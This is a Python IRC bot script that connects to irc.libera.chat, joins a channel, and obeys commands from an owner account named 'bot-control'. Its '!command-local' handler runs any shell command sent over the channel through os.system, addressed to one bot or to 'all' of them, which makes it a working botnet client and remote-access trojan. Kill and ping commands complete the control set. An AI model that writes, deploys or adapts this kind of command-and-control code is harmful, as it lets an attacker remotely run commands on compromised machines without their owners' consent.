# -imports-
import os
import random
import socket

# -server settings-
server = "irc.libera.chat"
port = 6667
channel = "#Galladite"
nickname = "bot" + str(random.randint(1, 99999))
owner = "bot-control"

# -definitions-
def sendMsg(message: str):
    irc.send(("PRIVMSG " + channel + " :" + message + "\r\n").encode(encoding="UTF-8"))

def identify():
    irc.send(("WHOIS " + owner + "\r\n").encode(encoding="UTF-8"))
    while True:
        recieved = irc.recv(2048).decode("UTF-8")
        if "logged in as" in recieved:
            return True
        if "End of /WHOIS list." in recieved:
            return False

# -command definitions-
def commands():
    if ":!command-irc " + nickname in recieved or ":!command-irc all" in recieved:
        print("Recieved.")
        if ":!command-irc " + nickname in recieved:
            msgToSend = recieved.split(":!command-irc " + nickname)[1] # get the command from the message
            msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
            irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
        else:
            msgToSend = recieved.split(":!command-irc all ")[1] # get the command from the message
            msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
            irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command

    if ":!command-local" + nickname in recieved or ":!command-local all" in recieved:
        if ":!command-local all" in recieved:
            command = recieved.split(":!command-local all ")[1]
            command = command[:len(command)-2]
            os.system(command)
        else:
            command = recieved.split(nickname + " ")[1]
            command = command[:len(command)-2]
            os.system(command)

    if ":!ping " + nickname in recieved or ":!ping all" in recieved:
        sendMsg("Pong!")

    if ":!kill " + nickname in recieved or ":!kill all" in recieved:
        irc.close()
        quit()

# -connection to server-
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((server, port))
irc.send(("USER " + nickname + " " + nickname + " " + nickname + " :bot\r\n").encode(encoding="UTF-8"))
irc.send(("NICK " + nickname + "\r\n").encode(encoding="UTF-8"))
irc.send(("JOIN " + channel + "\r\n").encode(encoding="UTF-8"))

# -detecting when a connection is established-
while True:
    recieved = irc.recv(2048).decode("UTF-8")
    if "/NAMES" in recieved:
        break

# -main loop-
while True:
    # -recieve messages-
    recieved = irc.recv(2048).decode("UTF-8")

    # -stay alive-
    if recieved.startswith("PING"):
        irc.send(("PONG " + recieved.split()[1] + "\r\n").encode())

    # -attempt commands-
    if recieved.split("!")[0] == ":" + owner and identify() == True:
        try:
            commands()
        except:
            pass
